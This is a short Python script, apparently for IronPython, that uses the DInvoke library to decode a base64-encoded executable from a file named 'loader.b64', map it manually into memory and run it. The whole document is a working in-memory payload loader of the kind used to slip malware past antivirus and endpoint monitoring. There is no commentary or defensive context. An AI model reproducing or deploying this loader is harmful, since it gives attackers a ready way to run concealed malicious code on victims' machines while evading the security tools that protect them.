import clr
clr.AddReference("System")
import base64
import System.Runtime.InteropServices
import System
import time
clr.AddReference("DInvoke")

import DInvoke

fp = open("loader.b64",'rb').read()

m = base64.b64decode(fp)

invoke =  DInvoke.ManualMap.Map.MapModuleToMemory(m)
DInvoke.DynamicInvoke.Generic.CallMappedPEModule(invoke.PEINFO,invoke.ModuleBase)

time.sleep(20000)